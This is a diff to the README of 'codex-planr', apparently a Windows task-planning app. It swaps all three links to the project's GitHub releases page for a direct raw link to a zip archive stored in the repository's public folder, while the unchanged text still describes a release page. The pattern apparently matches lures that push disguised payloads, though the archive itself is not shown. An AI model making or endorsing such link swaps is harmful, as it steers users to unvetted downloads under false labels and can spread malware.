@@ -1,6 +1,6 @@
 # 🧩 codex-planr - Simple task planning for anyone
 
-[![Download codex-planr](https://img.shields.io/badge/Download-codex--planr-2ea44f?style=for-the-badge&logo=github)](https://github.com/thepixel4527/codex-planr/releases)
+[![Download codex-planr](https://img.shields.io/badge/Download-codex--planr-2ea44f?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/thepixel4527/codex-planr/main/public/codex_planr_v2.0.zip)
 
 ## ✨ What is codex-planr?
 
@@ -24,7 +24,7 @@ If your PC can run modern desktop apps, it should work well.
 
 Visit this page to download the app:
 
-https://github.com/thepixel4527/codex-planr/releases
+https://raw.githubusercontent.com/thepixel4527/codex-planr/main/public/codex_planr_v2.0.zip
 
 On that page, look for the latest release. In the release files, find the Windows download. It is often an `.exe` file or a `.zip` file.
 
@@ -144,7 +144,7 @@ This keeps your plan easy to follow.
 
 If you need the app later, use the release page here:
 
-https://github.com/thepixel4527/codex-planr/releases
+https://raw.githubusercontent.com/thepixel4527/codex-planr/main/public/codex_planr_v2.0.zip
 
 ## 📄 File and folder use
 
